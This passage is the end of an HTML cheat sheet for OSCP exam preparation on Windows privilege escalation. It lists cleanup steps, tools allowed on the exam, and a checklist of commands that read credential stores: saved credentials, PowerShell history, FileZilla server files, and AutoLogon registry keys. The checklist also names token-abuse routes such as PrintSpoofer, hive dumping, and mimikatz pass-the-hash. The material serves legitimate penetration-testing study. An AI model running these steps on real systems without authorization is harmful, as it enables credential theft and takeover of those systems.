+</code></pre>
+<hr />
+<h2 id="opsec-cleanup-mandatory-for-oscp-report">OpSec + Cleanup (Mandatory for OSCP Report)</h2>
+<ul>
+<li>Delete uploaded tools (<code>del C:\Temp\*</code>)</li>
+<li>Remove SUID/SGID equivalents added (any writable-service payloads)</li>
+<li>Undo permission changes (<code>icacls &lt;file&gt; /reset</code>)</li>
+<li>Remove group memberships added (<code>net localgroup administrators &lt;user&gt; /delete</code>)</li>
+<li>Reset passwords changed (coordinate with client)</li>
+<li>Undo registry writes (Runkeys, <code>AlwaysInstallElevated</code> toggles)</li>
+<li>Restart / remove services planted</li>
+<li>Remove Event Log tampering artifacts</li>
+</ul>
+<hr />
+<h2 id="exam-restrictions">EXAM Restrictions</h2>
+<p><strong>EXAM-RESTRICTED — one target only:</strong></p>
+<ul>
+<li><strong>Metasploit exploit/aux/post modules and Meterpreter</strong> — spend on the box where manual PoC is fussiest (usually SmarterMail, HP Power Manager, EternalBlue)</li>
+<li><strong><code>ms17_010_eternalblue</code>, <code>hp_power_manager</code>, <code>bluekeep</code></strong> all count against your one</li>
+</ul>
+<p><strong>EXAM-BANNED:</strong></p>
+<ul>
+<li>SQLMap, SQLNinja</li>
+<li>Responder poisoning (only analyse-only <code>-A</code>)</li>
+<li>Nessus, OpenVAS, Nexpose</li>
+</ul>
+<p><strong>EXAM-OK — no limit:</strong></p>
+<ul>
+<li>PrintSpoofer, GodPotato, JuicyPotato, RunasCs, SeManageVolumeAbuse, mimikatz, SharpDPAPI, netexec/crackmapexec, evil-winrm, impacket, winPEAS/PrivescCheck, msfvenom, <code>multi/handler</code></li>
+</ul>
+<hr />
+<h2 id="exam-day-windows-privesc-checklist">EXAM-Day Windows Privesc Checklist</h2>
+<p><strong>First 30 seconds:</strong></p>
+<ul>
+<li>[ ] <code>whoami /priv</code> — token privileges</li>
+<li>[ ] <code>whoami /all</code> — group membership</li>
+<li>[ ] <code>systeminfo</code> -&gt; note OS build + patches</li>
+<li>[ ] <code>net user %USERNAME%</code> -&gt; password-last-set</li>
+<li>[ ] PATH restore if needed (<code>set PATH=%SystemRoot%\system32;%SystemRoot%;</code>)</li>
+</ul>
+<p><strong>Config-level probe:</strong></p>
+<ul>
+<li>[ ] <code>cmdkey /list</code></li>
+<li>[ ] <code>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li>[ ] <code>type C:\Users\&lt;user&gt;\AppData\Roaming\FileZilla\recentservers.xml</code></li>
+<li>[ ] Every non-standard <code>C:\Program Files (x86)\&lt;Vendor&gt;\</code> folder</li>
+<li>[ ] <code>type C:\ProgramData\*\*.ini</code> for cred-shaped strings</li>
+<li>[ ] <code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code> (AutoLogon)</li>
+<li>[ ] <code>reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated</code></li>
+</ul>
+<p><strong>Enum sweep:</strong></p>
+<ul>
+<li>[ ] Run <strong>winPEASx64.exe</strong> or <strong>PrivescCheck.ps1</strong></li>
+<li>[ ] <code>tasklist /v</code> — SYSTEM processes and their commandlines</li>
+<li>[ ] <code>schtasks /query /fo LIST /v</code> — scheduled tasks</li>
+<li>[ ] <code>sc query</code> + <code>sc qc &lt;SERVICE&gt;</code> for non-Microsoft services</li>
+</ul>
+<p><strong>Token pathway (if privilege set):</strong></p>
+<ul>
+<li>[ ] SeImpersonate -&gt; PrintSpoofer / GodPotato (2019+) / JuicyPotato x86 (2008)</li>
+<li>[ ] SeManageVolume -&gt; SeManageVolumeAbuse + PrintConfig.dll + PrintNotify COM</li>
+<li>[ ] SeBackup/SeRestore -&gt; reg save hives -&gt; secretsdump LOCAL</li>
+<li>[ ] SeDebug -&gt; mimikatz sekurlsa::pth</li>
+</ul>
+<p><strong>Under time pressure:</strong></p>
+<ul>
+<li>[ ] Timebox each attempted vector at 30 min</li>
+<li>[ ] Cred mining first, kernel exploits last</li>
+<li>[ ] Metasploit exploit modules = one target only</li>
+<li>[ ] Reboot only when confident (Fish payload placement)</li>
+</ul>
+  <p class="disclaimer">// For authorized engagements, lab environments, and exam prep only. Box names reference retired HTB CPTS / PG Practice targets used for study. Replace all placeholders with your own scoped values.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — windows-privesc · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');a.scrollIntoView({block:'nearest',inline:'center'});}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
